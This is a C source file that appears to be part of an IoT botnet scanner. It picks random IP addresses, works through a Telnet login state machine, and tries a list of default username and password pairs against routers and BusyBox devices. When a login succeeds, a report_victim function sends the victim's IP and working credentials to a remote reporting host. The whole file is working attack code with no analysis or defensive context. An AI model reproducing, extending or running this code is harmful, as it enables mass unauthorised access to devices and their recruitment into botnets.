#include <stdio.h>
#include <string.h>
#include <time.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <fcntl.h>
#include <unistd.h>

#include "scanner.h"
#include "credentials.h"

// gen a random ip in a given subnet
static uint32_t random_ip_in_subnet(uint32_t subnet, uint32_t mask) 
{
    uint32_t host_part = rand() & ~mask;
 
    // ignore broadcast and network itself
    if (host_part == 0 || host_part == ~mask) host_part = 1;
    return (subnet & mask) | host_part;
}

void report_victim(uint32_t ip, const char *user, const char *pass) 
{
    struct sockaddr_in addr = {0};
    addr.sin_family      = AF_INET;
    addr.sin_port        = htons(REPORT_PORT);
    addr.sin_addr.s_addr = inet_addr(REPORT_HOST);

    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return;

    if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
        char buf[128];
        struct in_addr in = { .s_addr = htonl(ip) };
        snprintf(buf, 
                sizeof(buf), 
                "%s:%s:%s\n", 
                inet_ntoa(in), 
                user, 
                pass
            );

        send(fd, buf, strlen(buf), 0);
    }

    close(fd);
}


// telnet simple state machine only cares about login in 
static void handle_telnet_data(ScanTarget *t) {
    char tmp[256];
    int n = recv(t->fd, tmp, sizeof(tmp) - 1, 0);
    if (n <= 0) {
        t->state = STATE_RESULT; // connection closed or error
        return;
    }
    tmp[n] = '\0';

    // Append to recv buffer (simple, bounded)
    int space = sizeof(t->recv_buf) - t->recv_len - 1;
    if (space > 0) {
        int copy = n < space ? n : space;
        memcpy(t->recv_buf + t->recv_len, tmp, copy);
        t->recv_len += copy;
        t->recv_buf[t->recv_len] = '\0';
    }

    t->last_activity = time(NULL);
    char *buf = t->recv_buf;

    switch (t->state) {

        case STATE_CONNECTING:
            // Waiting for any data — device is alive on Telnet
            t->state = STATE_WAITING_USERNAME;
            // Fall through — the first packet often contains the login prompt

        case STATE_WAITING_USERNAME:
            // Look for common login prompts
            if (strstr(buf, "login:") || strstr(buf, "Login:") ||
                strstr(buf, "Username:") || strstr(buf, "username:") ||
                strstr(buf, "user:")) {

                const char *user = DEFAULT_CREDS[t->cred_index].user;
                char line[64];
                snprintf(line, sizeof(line), "%s\r\n", user);
                send(t->fd, line, strlen(line), 0);

                // Clear buffer, wait for password prompt
                memset(t->recv_buf, 0, sizeof(t->recv_buf));
                t->recv_len = 0;
                t->state = STATE_WAITING_PASSWORD;
            }
            break;

        case STATE_WAITING_PASSWORD:
            if (strstr(buf, "Password:") || strstr(buf, "password:") ||
                strstr(buf, "passwd:")) {

                const char *pass = DEFAULT_CREDS[t->cred_index].pass;
                char line[64];
                snprintf(line, sizeof(line), "%s\r\n", pass);
                send(t->fd, line, strlen(line), 0);

                memset(t->recv_buf, 0, sizeof(t->recv_buf));
                t->recv_len = 0;
                t->state = STATE_WAITING_ENABLE;
            }
            break;

        case STATE_WAITING_ENABLE:
            // After sending creds, check if we got a shell prompt or failure
            if (strstr(buf, "#") || strstr(buf, "$") || strstr(buf, ">") ||
                strstr(buf, "BusyBox") || strstr(buf, "sh:")) {
                // ── SUCCESS ──
                report_victim(t->ip,
                              DEFAULT_CREDS[t->cred_index].user,
                              DEFAULT_CREDS[t->cred_index].pass);
                t->state = STATE_RESULT;

            } else if (strstr(buf, "incorrect") || strstr(buf, "failed") ||
                       strstr(buf, "denied") || strstr(buf, "Invalid")) {
                // ── FAILURE — try next credential pair ──
                t->cred_index++;
                if (t->cred_index >= (int)NUM_DEFAULT_CREDS) {
                    t->state = STATE_RESULT; // exhausted all creds
                } else {
                    // Re-enter username state for next pair
                    memset(t->recv_buf, 0, sizeof(t->recv_buf));
                    t->recv_len = 0;
                    t->state = STATE_WAITING_USERNAME;
                    // Some routers re-prompt; others need reconnect.
                    // For simplicity: send username immediately.
                    const char *user = DEFAULT_CREDS[t->cred_index].user;
                    char line[64];
                    snprintf(line, sizeof(line), "%s\r\n", user);
                    send(t->fd, line, strlen(line), 0);
                    t->state = STATE_WAITING_PASSWORD;
                }

            } else if (strstr(buf, "login:") || strstr(buf, "Login:")) {
                // Device re-prompted — credential was wrong
                t->cred_index++;
                if (t->cred_index >= (int)NUM_DEFAULT_CREDS) {
                    t->state = STATE_RESULT;
                } else {
                    memset(t->recv_buf, 0, sizeof(t->recv_buf));
                    t->recv_len = 0;
                    t->state = STATE_WAITING_USERNAME;
                }
            }
            break;

        default:
            break;
    }
}
